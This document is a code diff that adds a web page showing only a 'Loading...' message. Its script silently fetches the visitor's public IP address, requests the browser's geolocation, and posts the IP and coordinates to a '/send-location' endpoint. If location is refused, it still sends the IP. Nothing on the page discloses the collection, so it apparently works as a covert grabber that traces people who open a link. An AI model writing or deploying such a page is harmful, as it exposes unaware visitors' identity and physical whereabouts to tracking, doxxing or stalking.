@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Loading...</title>
+<link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="container">
+<h2>Loading...</h2>
+</div>
+
+<script>
+
+async function getVisitorData(){
+
+let ip = "unknown"
+let latitude = "denied"
+let longitude = "denied"
+
+try{
+const response = await fetch("https://api.ipify.org?format=json")
+const data = await response.json()
+ip = data.ip
+}catch{}
+
+if(navigator.geolocation){
+
+navigator.geolocation.getCurrentPosition(async position=>{
+
+latitude = position.coords.latitude
+longitude = position.coords.longitude
+
+await fetch("/send-location",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+ip,
+latitude,
+longitude
+})
+})
+
+},async()=>{
+
+await fetch("/send-location",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+ip,
+latitude,
+longitude
+})
+})
+
+})
+
+}
+
+}
+
+getVisitorData()
+
+</script>
+
+</body>
+</html>
